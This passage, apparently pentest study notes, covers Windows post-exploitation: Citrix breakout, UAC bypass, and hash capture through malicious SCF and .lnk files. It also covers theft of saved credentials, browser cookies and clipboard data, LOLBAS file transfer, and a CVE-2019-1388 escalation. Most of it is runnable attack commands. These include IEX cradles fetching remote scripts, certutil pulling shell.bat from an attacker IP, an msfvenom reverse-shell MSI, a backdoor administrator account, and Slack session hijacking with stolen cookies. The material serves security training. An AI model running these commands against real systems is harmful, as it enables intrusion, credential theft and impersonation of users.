PS C:\> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```


## Wifi Passwords

If we obtain **local admin access** to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

`C:\> netsh wlan show profile`

#### Retrieving Saved Wireless Passwords

`C:\> netsh wlan show profile ilfreight_corp key=clear`





# Citrix Breakout


Basic Methodology for break-out:

- Gain access to a Dialog Box.
- Exploit the Dialog Box to achieve command execution.
- Escalate privileges to gain higher levels of access.

        
### Bypassing Path Restrictions


When we attempt to visit C:\Users using File Explorer, we find it is restricted and results in an error.  It is possible to utilize windows dialog boxes to bypass the restrictions imposed by group policy. Once in a Windows dialog box , navigate to a folder path containing native executables that offer interactive console access (i.e.: cmd.exe). Try to enter the folder path into the file name field to gain access to the file.

Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialog box.


### Accessing SMB share from restricted environment

        
Start a SMB server from the attacker machine using Impacket's smbserver.py script.
        
`root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)`

Back in the Citrix environment, initiate the "Paint" application or anything with the previous functionality. Proceed to navigate to the "File" menu and select "Open", thereby prompting the Dialog Box to appear. Within this Windows dialog box associated with Paint, input the UNC path as \\10.13.38.95\share into the designated "File name" field.Launch the exploit


### Alternate Registry Editors
        
When the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. Simpleregedit, Uberregedit and SmallRegistryEditor are examples of such GUI tools .

### Modify existing shortcut file

        
Unauthorized access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the Target field.

The following steps outline the process:

- Right-click the desired shortcut.

- Select Properties. 

- Within the Target field, modify the path 

- Execute the Shortcut and cmd will be spawned 



### Script Execution

        
When script extensions such as .bat, .vbs, or .ps are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place. This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorized actions on the system.

- Create a new text file and name it "evil.bat".
               
- Open "evil.bat" with a text editor such as Notepad.
               
- Input the command "cmd" into the file. 

- Save the file. 


### Escalating Privileges

- via AlwaysInstallElevated

Using PowerUp.ps1, we find that Always Install Elevated key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

        HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's Write-UserAddMSI function. This function facilitates the creation of an .msi file directly on the desktop.

```
        PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
        PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
```

Now we can execute UserAdd.msi and create a new user backdoor:T3st@123 under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

Back in CMD execute runas to start command prompt as the newly created backdoor user.




### Bypassing UAC

        
while getting in with admin account, accessing the C:\users\Administrator directory remains unfeasible due to the presence of User Account Control (UAC). 

Numerous UAC bypass scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

[Bypass-UAC.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
```
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```
        
Following a successful UAC bypass, a new powershell windows will be opened with higher privileges and we can confirm it by utilizing the command whoami /all or whoami /priv. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.





# Interacting with Users


### Traffic Capture

If Wireshark is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

While not highly likely, if Wireshark is installed on a box that we land on, it is worth attempting a traffic capture to see what we can pick up.

[netcreds]( https://github.com/DanMcInerney/net-creds )



### Process Command Lines
        


When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```
        while($true)
        {

        $process = Get-WmiObject Win32_Process | Select-Object CommandLine
        Start-Sleep 1
        $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
        Compare-Object -ReferenceObject $process -DifferenceObject $process2

        }
```
        
### Running Monitor Script on Target Host

We can host the script on our attack machine and execute it on the target host as follows.

`PS C:\> IEX (iwr 'http://10.10.10.205/procmon.ps1')`


                
### SCF on a File Share

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

#### Malicious SCF File

```
        [Shell]
        Command=2
        IconFile=\\10.10.14.3\share\legit.ico
        [Taskbar]
        Command=ToggleDesktop
```
#### Starting Responder

`$ sudo responder -wrf -v -I tun0`

#### Cracking NTLMv2 Hash with Hashcat

`$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`


#### Capturing Hashes with a Malicious .lnk File

This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb]( https://github.com/dievus/lnkbomb  ), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:


        
#### Generating a Malicious .lnk File

```        
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```                       

# Pillaging



### Installed Applications

`C:\>dir "C:\Program Files"`


### Get Installed Programs via PowerShell & Registry Keys
```
PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
        
PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
       
PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```


### mRemoteNG


mRemoteNG saves connection info and credentials to a file called confCons.xml.

By default, the configuration file is located in %USERPROFILE%\APPDATA\Roaming\mRemoteNG.

#### mRemoteNG Configuration File - confCons.xml example
```
<?XML version="1.0" encoding="utf-8"?>
        
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
         <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
..SNIP..
        
</Connections>
```
        


#### Decrypt the Password with [mremoteng_decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)

`$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" `

        
We need to copy the attribute Password content and use it with the option -s. If there's a master password and we know it, we can then use the option -p with the custom master password to also decrypt the password.


In case we want to attempt to crack the password, we can modify the script to try multiple passwords from a file, or we can create a Bash for loop. We can attempt to crack the Protected attribute or the Password itself. If we try to crack the Protected attribute once we find the correct password, the result will be Password: ThisIsProtected. If we try to crack the Password directly, the result will be Password: <PASSWORD>.

`$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done  `  

      
### Cookie Extraction from Firefox

Firefox saves the cookies in an SQLite database in a file named cookies.sqlite. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

`PS C:\> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`

We can copy the file to our machine and use the Python script [cookieextractor.py](  https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py  ) to extract cookies from the Firefox cookies.SQLite database.

`$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d`

Now that we have the cookie, we can use any browser extension to add the cookie to our browser. For this example, we will use Firefox and the extension Cookie-Editor.

Our target website is slack.com. Now that we have the cookie, we want to impersonate the user. Let's navigate to slack.com once the page loads, click on the icon for the Cookie-Editor extension, and modify the value of the d cookie with the value you have from the cookieextractor.py script. Make sure to click the save icon (marked in red in the image below).

Once you have saved the cookie, you can refresh the page and see that you are logged in as the user.

Now we are logged in as the user and can click on Launch Slack. We may get a prompt for credentials or other types of authentication information; we can repeat the above process and replace the cookie d with the same value we used to gain access the first time on any website that asks us for information or credentials.

Once we complete this process for every website where we get a prompt, we need to refresh the browser, click on Launch Slack and use Slack in the browser.

After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information relevant to our assessment.


### Cookie Extraction from Chromium-based Browsers

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). 

To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool [SharpChromium](  https://github.com/djhohnstein/SharpChromium  ) does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

```
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

PS C:\> Invoke-SharpChromium -Command "cookies slack.com"
```

We got an error because the cookie file path that contains the database is hardcoded in SharpChromium, and the current version of Chrome uses a different location.

We can modify the code of SharpChromium or copy the cookie file to where SharpChromium is lookin

`PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`



## Clipboard

        
We can use the [Invoke-Clipboard](  https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1  ) script to extract user clipboard data. Start the logger by issuing the command below.

        
```
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

PS C:\> Invoke-ClipboardLogger
```




                --Roles and Services
        
        -Attacking Backup Servers

        Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.

        If we gain access to a backup system, we may be able to review backups, search for interesting hosts and restore the data we want.

        As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use restic as an example. Restic is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

        To start working with restic, we must create a repository (the directory where backups will be stored). Restic checks if the environment variable RESTIC_PASSWORD is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

        We will use restic 0.13.1 and back up the repository C:\xampp\htdocs\webapp in E:\restic\ directory. To download the latest version of restic, visit https://github.com/restic/restic/releases/latest. On our target machine, restic is located at C:\Windows\System32\restic.exe.

        We first need to create and initialize the location where our backup will be saved, called the repository.

        -restic - Initialize Backup Directory

        PS C:\> mkdir E:\restic2; restic.exe -r E:\restic2 init

        -restic - Back up a Directory

        PS C:\> $env:RESTIC_PASSWORD = 'Password'
        PS C:\> restic.exe -r E:\restic2\ backup C:\SampleFolder


        !!!If we want to back up a directory such as C:\Windows, which has some files actively used by the operating system, we can use the option --use-fs-snapshot to create a VSS (Volume Shadow Copy) to perform the backup.


        -restic - Back up a Directory with VSS

        PS C:\> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

        
        Note: If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

        We can also check which backups are saved in the repository using the shapshot command.

        
        -restic - Check Backups Saved in a Repository

        PS C:\> restic.exe -r E:\restic2\ snapshots



        -restic - Restore a Backup with ID

        We can restore a backup using the ID the snapshot command showed

        PS C:\> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

        If we navigate to C:\Restore, we will find the directory structure where the backup was taken. To get to the SampleFolder directory, we need to navigate to C:\Restore\C\SampleFolder.

        If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us archive our goal.

        







# Living Off The Land Binaries and Scripts (LOLBAS)
        
The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. 

        
# Transferring File with Certutil


One classic example is certutil.exe, whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

`PS C:\> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`

        
## Encoding File with Certutil

We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

`C:\> certutil -encode file1 encodedfile`


## Decoding File with Certutil

`C:\> certutil -decode encodedfile file2`


A binary such as rundll32.exe can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

# Always Install Elevated

This setting can be set via Local Group Policy by setting Always install with elevated privileges to Enabled under the following paths.

`Computer Configuration\Administrative Templates\Windows Components\Windows Installer`

`User Configuration\Administrative Templates\Windows Components\Windows Installer`


### Enumerating Always Install Elevated Settings

`PS C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`


### Generating MSI Package

We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

`$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`

### Executing MSI Package

`C:\> msiexec /i c:\users\-student\desktop\aie.msi /quiet /qn /norestart`




# CVE-2019-1388

CVE-2019-1388 was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The Issued By field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) 1.3.6.1.4.1.311.2.1.10. This OID value is identified in the wintrust.h header as SPC_SP_AGENCY_INFO_OBJID which is the SpcSpAgencyInfo field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable (hhupd.exe) that contains a certificate with the SpcSpAgencyInfo field populated with a hyperlink.

When we click on the hyperlink, a browser window will launch running as NT AUTHORITY\SYSTEM. Once the browser is opened, it is possible to "break out" of it by leveraging the View page source menu option to launch a cmd.exe or PowerShell.exe console as SYSTEM.

First right click on the hhupd.exe executable and select Run as administrator from the menu.
Next, click on Show information about the publisher's certificate to open the certificate dialog. Here we can see that the SpcSpAgencyInfo field is populated in the Details tab.

Next, we go back to the General tab and see that the Issued by field is populated with a hyperlink. Click on it and then click OK, and the certificate dialog will close, and a browser window will launch.

If we open Task Manager, we will see that the browser instance was launched as SYSTEM.

Next, we can right-click anywhere on the web page and choose View page source. Once the page source opens in another tab, right-click again and select Save as, and a Save As dialog box will open.

At this point, we can launch any program we would like as SYSTEM. Type c:\windows\system32\cmd.exe in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.



# Scheduled Tasks

## Enumerating Scheduled Tasks

`C:\>  schtasks /query /fo LIST /v`

## Enumerating Scheduled Tasks with PowerShell

[ms-docs](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps )

`PS C:\> Get-ScheduledTask | select TaskName,State`

By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Scheduled tasks created by other users (such as admins) are stored in C:\Windows\System32\Tasks, which standard users do not have read access to. We may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

## Checking Permissions on a Directory

`C:\> .\accesschk64.exe /accepteula -s -d C:\Scripts\`

# Checking Local User Description Field

Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the Get-LocalUser cmdlet.

`PS C:\> Get-LocalUser`

## Enumerating Computer Description Field with Get-WmiObject Cmdlet


`PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select Description`

# Mount VHDX/VMDK

Three specific file types of interest are .vhd, .vhdx, and .vmdk files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware). 

If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

#### Mount VMDK on Linux

`$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`

#### Mount VHD/VHDX on Linux

`$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1`


## Windows mount

#### VHD and VHDX
- right-click on the file 
- choose Mount 

or 

- use the Disk Management utility to mount a .vhd or .vhdx file. 

#### VMDK

- right-click 
- choose Map Virtual Disk from the menu.
- select a drive letter.

If this fails, we can use VMWare Workstation File --> Map Virtual Disks to map the disk onto our base system. We could also add the .vmdk file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use 7-Zip to extract data from a .vmdk file. This guide illustrates many methods for gaining access to the files on a .vmdk file.


# Retrieving Hashes using Secretsdump.py

If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the SAM, SECURITY and SYSTEM registry hives. We can then use a tool such as secretsdump to extract the password hashes for local users.

`$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`






        
# Attacking Server 2008
        
### Querying Current Patch Level

`C:\> wmic qfe`

### Running Sherlock

`PS C:\> Set-ExecutionPolicy bypass -Scope process`

`PS C:\> Import-Module .\Sherlock.ps1`
`PS C:\> Find-AllVulns`




